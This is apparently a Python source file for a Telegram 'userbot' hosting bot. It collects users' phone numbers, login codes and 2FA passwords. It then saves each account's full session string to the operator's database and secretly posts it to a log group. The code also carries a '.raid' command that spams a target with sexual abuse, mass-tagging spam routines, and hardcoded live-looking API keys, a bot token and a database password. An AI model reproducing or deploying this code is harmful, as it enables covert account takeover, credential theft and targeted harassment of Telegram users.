import os
import asyncio
import random
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread
from pymongo import MongoClient

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"
MONGO_URI = "mongodb+srv://Nova:NovaCoder76@cluster0.njvqq11.mongodb.net/NovaDB?retryWrites=true&w=majority&appName=Cluster0"

# OWNER DETAILS
OWNER_ID = 8724182918
OWNER_USERNAME = "@CoderNova"

# --- DATABASE SETUP ---
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["XenoGenDB"]
sessions_col = db["sessions"]

# --- WEB SERVER FOR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "xᴇɴᴏ BᴏTLɪᴠᴇ! ✨"

def run_web():
    app.run(host='0.0.0.0', port=8080)

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}
running_ubots = {}

# --- BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- DAILY USE CHATS (SIMPLE TEXT - NO FANCY FONTS - NO EMOJIS) ---
DAILY_CHATS = [
    "Kya kr rhe ho {mention}",
    "Kaise ho {mention}",
    "Radhe radhe {mention}",
    "Jay shree ram {mention}",
    "Or ghar pe kaise h {mention}",
    "Khana khaye {mention}",
    "Aur batao kya chal raha hai {mention}",
    "Kahan busy ho aajkal {mention}",
    "Online aao jaldi {mention}",
    "Kuch kaam tha tumse {mention}",
    "Hello brother kaise ho {mention}",
    "Kya chal raha hai bhai {mention}",
    "Ghar me sab theek thak h na {mention}",
    "Khana khana kha liya tumne {mention}",
    "Milte hain thodi der me {mention}",
    "Suno ek baar idhar aao {mention}",
    "Free ho to message karo {mention}",
    "Aapka kya haal chal hai {mention}",
    "Kuch naya batao yaar {mention}",
    "Jaldi se reply do {mention}",
    "Kahan chale gaye bina bataye {mention}",
    "Bahut dino baad dikhe {mention}",
    "Aapki yaad aa rahi thi {mention}",
    "Sab badhiya chal raha h na {mention}",
    "Chalo baad me baat karte hain {mention}",
    "Kahan par ho abhi aap {mention}",
    "Mera ek kaam kar do {mention}",
    "Sote hi rehte ho kya hamesha {mention}",
    "Kya chal raha h aajkal {mention}",
    "Aapki tabiyat kaisi h abhi {mention}",
    "Bhai ek help chahiye thi {mention}",
    "Chalo milkar baat karte hain {mention}",
    "Call karo jab free ho jao {mention}",
    "Aapka din kaisa raha aaj ka {mention}",
    "Baki sab sahi chal raha hai na {mention}",
    "Aapne reply nahi diya abhi tak {mention}",
    "Main abhi thoda busy hoon {mention}",
    "Chalo koi baat nahi fir {mention}",
    "Aap bahut acche ho yaar {mention}",
    "Free ho gaye kya aap {mention}",
    "Idhar aao thoda kaam hai {mention}",
    "Good morning kaise ho {mention}",
    "Good night so jao ab {mention}",
    "Aapki yaad aa rahi thi bahut {mention}",
    "Sab theek h na wahan par {mention}",
    "Main abhi aaya bas thodi der me {mention}",
    "Kya kar rahe the itni der se {mention}",
    "Kuch bolo chup kyun ho {mention}",
    "Aap kahan se ho vaise {mention}",
    "Chalo kal baat karte hain ab {mention}"
]

ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target ᴋᴀ ʟᴀɴᴅ 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ! 🔥"
]

# --- USERBOT COMMAND FUNCTIONS ---

async def alive_cmd(c, m):
    await m.edit_text("✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨")

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
    await m.delete()
    
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                first_name = member.user.first_name or "User"
                mention = f"[{first_name}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text} {mention}")
                await asyncio.sleep(random.uniform(3.0, 4.5))
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    except Exception:
        pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                first_name = member.user.first_name or "User"
                mention = f"[{first_name}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(random.uniform(3.5, 5.0))
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    except Exception:
        pass

async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    if len(args) < 3: 
        return await m.edit_text("❌ **Usage:** `.raid 5 @username`")
        
    active_tasks[uid] = True 
    try:
        count = int(args[1])
        target = args[2]
        await m.delete()
        
        for _ in range(count):
            if not active_tasks.get(uid): break 
            try:
                msg = random.choice(ABUSE_RAIDS).replace("@target", target)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(random.uniform(2.0, 3.5)) 
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    except Exception:
        pass

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")

# --- HANDLER ATTACHMENT ---
def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))

# --- BOT MAIN COMMANDS ---

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(photo=START_IMG, caption=f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\nʜᴇʏ {m.from_user.mention}, /add sᴇ sᴛᴀʀᴛ ᴋᴀʀᴇɪɴ.", reply_markup=main_buttons)

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ (e.g. +91XXXXXXXXXX):**")

@bot.on_message(filters.command("remove") & filters.private)
async def owner_remove_panel(c, m):
    # Check if the user is the authorized owner
    if m.from_user.id != OWNER_ID:
        uid = m.from_user.id
        if uid in running_ubots:
            try:
                await running_ubots[uid].stop()
                del running_ubots[uid]
                sessions_col.delete_one({"user_id": uid})
                return await m.reply_text("✅ **ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴛᴏᴘᴘᴇᴅ ᴀɴᴅ ʀᴇᴍᴏᴠᴇᴅ!**")
            except Exception as e:
                return await m.reply_text(f"❌ **Error:** `{e}`")
        else:
            return await m.reply_text("❓ **ᴀᴀᴘᴋᴀ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ʙᴏᴛ ɴᴀʜɪ ᴍɪʟᴀ.**")

    # Owner Panel
    saved_sessions = list(sessions_col.find({}))
    if not saved_sessions:
        return await m.reply_text(f"😔 **Database me koi active session nahi mila, Owner {OWNER_USERNAME}!**")
    
    keyboard = []
    for sess in saved_sessions:
        u_id = sess["user_id"]
        status = "🟢" if u_id in running_ubots else "🔴"
        keyboard.append([InlineKeyboardButton(f"{status} User ID: {u_id}", callback_data=f"info_{u_id}")])
        keyboard.append([InlineKeyboardButton("🗑️ Remove Account", callback_data=f"rem_{u_id}")])
    
    keyboard.append([InlineKeyboardButton("❌ Close Panel", callback_data="close")])
    await m.reply_text(f"🛠️ **Owner Control Panel ({OWNER_USERNAME}):**\nNeeche chal rahe sabhi active accounts ki list hai:", reply_markup=InlineKeyboardMarkup(keyboard))

@bot.on_callback_query()
async def handle_callbacks(c, q):
    data = q.data
    if data == "close":
        await q.message.delete()
    elif data.startswith("info_"):
        u_id = int(data.split("_")[1])
        await q.answer(f"User ID: {u_id} par action select karein.", show_alert=True)
    elif data.startswith("rem_"):
        if q.from_user.id != OWNER_ID:
            return await q.answer(f"❌ Aap authorized Owner ({OWNER_USERNAME}) nahi hain!", show_alert=True)
        
        target_uid = int(data.split("_")[1])
        sessions_col.delete_one({"user_id": target_uid})
        
        if target_uid in running_ubots:
            try:
                active_tasks[target_uid] = False
                await running_ubots[target_uid].stop()
                del running_ubots[target_uid]
            except Exception:
                pass
        
        await q.answer("✅ Session completely terminated & deleted!", show_alert=True)
        
        # Refresh Admin panel list dynamically
        saved_sessions = list(sessions_col.find({}))
        if not saved_sessions:
            await q.message.edit_text("😔 **Database me koi bhi active session nahi mila.**")
            return
        
        keyboard = []
        for sess in saved_sessions:
            u_id = sess["user_id"]
            status = "🟢" if u_id in running_ubots else "🔴"
            keyboard.append([InlineKeyboardButton(f"{status} User ID: {u_id}", callback_data=f"info_{u_id}")])
            keyboard.append([InlineKeyboardButton("🗑️ Remove Account", callback_data=f"rem_{u_id}")])
        keyboard.append([InlineKeyboardButton("❌ Close Panel", callback_data="close")])
        await q.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ʟɪᴋᴇ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **2FA ᴘᴀssᴡᴏʀᴅ sᴇɴᴅ ᴋᴀʀᴇɪɴ.**")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    
    # Mongo permanent save
    sessions_col.update_one({"user_id": uid}, {"$set": {"session": string}}, upsert=True)
    
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    register_ubot_handlers(ubot)
    
    await ubot.start()
    running_ubots[uid] = ubot
    await m.reply_text("✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ! Permanent saved to DB.**")
    try:
        await data["client"].send_message("me", f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`")
        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
    except Exception: pass
    del user_data[uid]

# --- AUTO BOOTSTRAP SESSIONS ---
async def start_all_saved_sessions():
    await bot.start()
    print("[INFO] Bot started! Loading saved userbot sessions from MongoDB...")
    saved_sessions = sessions_col.find({})
    for data in saved_sessions:
        uid = data["user_id"]
        string = data["session"]
        try:
            ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[uid] = ubot
            print(f"[SUCCESS] Loaded session for user: {uid}")
        except Exception as e:
            print(f"[ERROR] Failed to boot session for {uid}: {e}")
    print("[INFO] All database sessions deployment loop finished.")

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_all_saved_sessions())
    print("✨ Bot is fully online!")
    asyncio.get_event_loop().run_forever()
